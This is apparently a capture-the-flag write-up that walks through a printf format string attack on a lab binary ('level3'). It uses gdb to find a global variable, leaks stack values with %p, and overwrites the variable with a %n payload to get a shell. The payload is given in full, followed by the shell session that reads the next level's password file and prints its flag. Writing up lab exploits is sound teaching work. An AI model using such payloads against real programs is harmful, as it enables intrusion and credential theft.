## Press printf's f for fun and profit (level3)

This level's [binary](source.c) is fairly similar to the last one. It takes user
input and prints it back to stdin:

```shell
# run the binary
./level3
# give it some input
blablabla
# get our input
blablabla
```

However, this time fgets is used to get user input and the buffer length is
valid so the input itself is protected. Although now it's not puts that is used
to print back the input but printf, directly on the input buffer. This means
that we can feed a printf format string directly into this binary which allows
us to perform a
[format string attack](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b).

After analysis of the binary through ghidra and gdb, we can see that there is an
unitialized global variable _m_ (thus living in the .bss part of our program's
memory). Since it is not explicitly given a value by the user, it will be set to
0\. This variable is only used once. It is compared to 0x40 (so if it is equal
to 64). If it is indeed equal to this value the binary will give us a shell. So
the goal here is to find a way to set _m_ to 64 through the printf call.

First let's get _m_'s address:

```shell
# run gdb on the binary
gdb ./level3
# get the address
(gdb) i addr m
Symbol "m" is at 0x804988c in a file compiled without debugging.
```

Now we can try adding some conversions to the format string to pop random values
from a stack and when we reach our buffer:

```shell
echo 'aaaabbbbccccdddd %p %p %p %p' | ./level3
aaaabbbbccccdddd 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161
```

The p conversion prints the input value as a pointer (here a 32bit pointer) in
hexadecimal. Here the fourth value is "0x61616161" so this means we reached our
buffer starting with "aaaa" (since 0x61 is the ascii code for 'a'). This means
that from the fourth conversion we control which parameter we give to printf.
All we have to do here is to start our exploit payload with the bytes
representing the _m_ variable's address and to use the n conversion to write on
it. The n conversion will not print anything, it will simply write the number of
bytes printed by printf to the given address. We must make the entire format
print 64 bytes. To do this we just need to adjust the conversions field width.

Here's the magic payload:

```shell
# feed the exploit payload to the binary
(python -c 'print "\x08\x04\x98\x8c"[::-1] + "%08p%08p%042p%n"'; cat) | ./level3
0x0002000xb7fd1ac00x00000000000000000000000000000000b7ff37d0
Wait what?!
# there we are, we got the shell
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
